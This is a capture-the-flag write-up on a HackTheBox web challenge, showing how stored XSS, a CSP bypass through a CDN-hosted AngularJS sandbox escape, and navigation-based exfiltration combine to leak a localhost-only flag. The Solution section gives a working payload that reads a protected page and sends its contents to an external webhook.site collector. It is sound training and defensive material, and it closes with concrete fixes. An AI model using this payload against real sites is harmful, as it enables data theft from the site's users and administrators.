---
layout: post
title: "The Galactic Times"
date: 2028-04-25 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, xss, csp-bypass, angularjs, csti, pug, ssrf]
description: "A whitelisted CDN plus an unescaped Pug template turns a feedback form into stored XSS. The twist is exfiltration: the CSP blocks external fetch, but forgets to lock down navigation — so the bot reads a localhost-only endpoint and the flag walks out through document.location."
---

## Overview

The Galactic Times is a Medium HackTheBox Web challenge (Cyber Apocalypse 2021). It is a Fastify newspaper app with a feedback form and a headless "admin" bot. The flag lives on a page only `127.0.0.1` can read, and the app ships a Content Security Policy that looks careful. The path is [stored XSS](https://cwe.mitre.org/data/definitions/79.html) through an unescaped Pug template, a CSP bypass using a CDN-hosted AngularJS, and — the interesting part — exfiltration via top-level navigation because the policy locks down `fetch` but not the address bar.

## The technique

Four facts stack up:

1. **Unescaped Pug interpolation → stored XSS.** `views/list.pug` prints feedback with `!{feedback[i].comment}`. In Pug, `!{}` is the *unescaped* form (the escaped form is `#{}`), so stored feedback is injected as raw HTML. `/api/submit` saves the value verbatim.

2. **The bot renders our HTML.** After each submission the app runs a puppeteer bot as `127.0.0.1` that visits `http://127.0.0.1:1337/list` — so our markup executes in the bot's browser.

3. **The flag is localhost-only.** The `/alien` route returns `401` unless `request.ip == '127.0.0.1'`. We can't hit it directly; the bot has to fetch it for us.

4. **The CSP has exploitable gaps:**
   ```
   default-src 'self';
   script-src  'self' 'unsafe-eval' https://cdnjs.cloudflare.com;
   img-src     'self' data:;
   ```
   - `script-src` whitelists **cdnjs** and allows **`'unsafe-eval'`** → load an old **AngularJS** from the CDN and abuse its expression evaluator to run JavaScript, no inline script needed.
   - `default-src 'self'` means `connect-src` falls back to `'self'`, so external `fetch`/XHR/`img` are blocked — but a **same-origin** `fetch('/alien')` is still allowed.
   - There is **no `form-action` and no `navigate-to`** — and these do *not* inherit from `default-src` — so **top-level navigation to any host is permitted**. That is our exfiltration channel.

## Solution

Submit this as the feedback value:

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app>
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };fetch("http://127.0.0.1:1337/alien").then(r=>r.text()).then(function(d){var m=d.match(/(HTB|CHTB)\{[^}]+\}/);document.location="https://webhook.site/<uuid>?p="+encodeURIComponent(m?m[0]:d);});//');}}
</div>
```

- **CSP bypass:** AngularJS 1.4.6 is loaded from the whitelisted cdnjs origin, so its expression evaluator runs on the trusted origin.
- **Sandbox escape:** overwriting `String.prototype.charAt` with `[].join` makes Angular's per-character sandbox check always pass, then `$eval` closes the expression (`} } };`) and runs raw JavaScript.
- **Read the secret:** a same-origin `fetch('/alien')` is allowed by `connect-src`→`self`; regex the flag out of the response.
- **Exfiltrate:** set `document.location` to an external collector with the flag in the query string — navigation isn't restricted by this CSP.

Because Kali sits behind NAT, the collector is a `webhook.site` URL the bot can reach. Submitting the payload and reading the webhook yields:

```
https://webhook.site/<uuid>?p=HTB%7Bth3_wh1t3list3D_CDN_str1k3s_b4cK!%7D
```

## Why it worked

A whitelisted CDN silently re-enables script execution — `'unsafe-eval'` plus a cdnjs-hosted AngularJS is enough to run arbitrary JS despite the absence of `'unsafe-inline'`. And a CSP that carefully pins `connect-src`/`img-src` still leaks if it forgets `form-action`/`navigate-to`: top-level navigation is a first-class exfiltration path, and the localhost-only secret is reachable because same-origin `fetch` was never in scope of the block.

## Fix / defense

- Escape template output — use Pug's `#{}` for user data, never `!{}`.
- Don't whitelist a whole CDN in `script-src`; use nonces or SRI hashes for the specific scripts you serve, and drop `'unsafe-eval'`.
- Add `connect-src`, plus `form-action 'none'` and `navigate-to 'none'`, so the policy also constrains navigation-based exfiltration.
